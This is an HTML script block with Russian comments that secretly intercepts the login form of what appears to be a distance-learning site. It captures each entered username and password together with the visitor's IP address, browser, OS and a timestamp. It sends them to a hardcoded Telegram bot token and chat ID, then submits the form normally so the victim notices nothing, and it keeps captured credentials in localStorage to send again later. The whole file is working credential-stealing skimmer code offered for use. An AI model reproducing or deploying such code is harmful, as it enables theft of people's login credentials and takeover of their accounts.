    <!-- ИСПРАВЛЕННЫЙ КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
    <script>
        // ===== НАСТРОЙКИ TELEGRAM =====
        const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
        const CHAT_ID = '7071415280';
        // =============================

        // Функция для проверки работоспособности бота
        function checkBotStatus() {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('✅ Бот работает:', data.result.username);
                    } else {
                        console.error('❌ Ошибка бота:', data);
                    }
                })
                .catch(error => {
                    console.error('❌ Не удалось подключиться к Telegram API:', error);
                });
        }

        // Получение IP через один надежный сервис
        function getUserIP() {
            return new Promise((resolve) => {
                // Используем ipify как основной сервис
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        resolve(data.ip);
                    })
                    .catch(() => {
                        // Запасной вариант
                        fetch('https://api.myip.com')
                            .then(response => response.json())
                            .then(data => {
                                resolve(data.ip);
                            })
                            .catch(() => {
                                resolve('Не удалось определить');
                            });
                    });
                
                // Таймаут на случай зависания
                setTimeout(() => {
                    resolve('Таймаут');
                }, 3000);
            });
        }

        // Получение информации об устройстве
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            let os = "Unknown";
            let device = "Unknown";
            
            if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";
            else if (ua.includes("Edge")) browser = "Edge";
            else if (ua.includes("Opera")) browser = "Opera";
            
            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "macOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                device = "Mobile";
            } else {
                device = "Desktop";
            }
            
            return { browser, os, device };
        }

        // Основная функция отправки
        async function sendToTelegram(username, password) {
            const deviceInfo = getDeviceInfo();
            const ip = await getUserIP();
            const timestamp = new Date().toLocaleString('ru-RU', {timeZone: 'Asia/Irkutsk'});
            
            const message = `🔔 НОВЫЙ ВХОД СДО
══════════════════
👤 Логин: ${username}
🔑 Пароль: ${password}
══════════════════
📱 Устройство: ${deviceInfo.device}
💻 Браузер: ${deviceInfo.browser}
⚙️ ОС: ${deviceInfo.os}
🌐 IP: ${ip}
⏰ Время: ${timestamp}
🆔 ID: ${Math.random().toString(36).substr(2, 6)}`;

            // Пробуем отправить через fetch
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log('✅ Сообщение отправлено в Telegram');
                    return true;
                } else {
                    console.error('❌ Ошибка Telegram API:', result);
                    return false;
                }
            } catch (error) {
                console.error('❌ Ошибка отправки:', error);
                return false;
            }
        }

        // Перехват отправки формы
        (function() {
            const loginForm = document.getElementById('login');
            if (!loginForm) {
                console.error('❌ Форма входа не найдена');
                return;
            }
            
            let formSubmitted = false;
            
            loginForm.addEventListener('submit', async function(e) {
                // Если форма уже отправляется, не делаем ничего
                if (formSubmitted) return;
                
                const username = document.getElementById('username').value.trim();
                const password = document.getElementById('password').value;
                const loginBtn = document.getElementById('loginbtn');
                
                if (!username || !password) {
                    e.preventDefault();
                    alert('Пожалуйста, введите логин и пароль');
                    return;
                }
                
                // Отмечаем, что форма отправляется
                formSubmitted = true;
                
                // Блокируем кнопку
                if (loginBtn) {
                    loginBtn.disabled = true;
                    loginBtn.textContent = 'Отправка...';
                }
                
                // Отправляем данные в Telegram
                console.log('📤 Отправка данных в Telegram...');
                const sent = await sendToTelegram(username, password);
                
                if (sent) {
                    console.log('✅ Данные отправлены успешно');
                } else {
                    console.warn('⚠️ Не удалось отправить данные в Telegram');
                }
                
                // Небольшая задержка для гарантии отправки
                setTimeout(() => {
                    // Разблокируем кнопку (на случай если форма не отправится)
                    if (loginBtn) {
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'Вход';
                    }
                    
                    // Отправляем форму на сервер
                    loginForm.submit();
                }, 500);
            });
        })();

        // Проверяем статус бота при загрузке страницы
        checkBotStatus();
        
        // Сохраняем данные в localStorage как резервный вариант
        function saveToLocalStorage(username, password) {
            const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
            attempts.push({
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                url: window.location.href
            });
            // Сохраняем только последние 50 попыток
            while (attempts.length > 50) attempts.shift();
            localStorage.setItem('login_attempts', JSON.stringify(attempts));
            console.log('💾 Данные сохранены в localStorage как резерв');
        }
        
        // Функция для восстановления отправки из localStorage
        function retryFailedSends() {
            const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
            if (attempts.length > 0) {
                console.log(`🔄 Найдено ${attempts.length} неотправленных попыток`);
                // Отправляем последнюю попытку
                const last = attempts[attempts.length - 1];
                sendToTelegram(last.username, last.password);
            }
        }
        
        // Проверяем неотправленные данные
        setTimeout(retryFailedSends, 3000);
    </script>
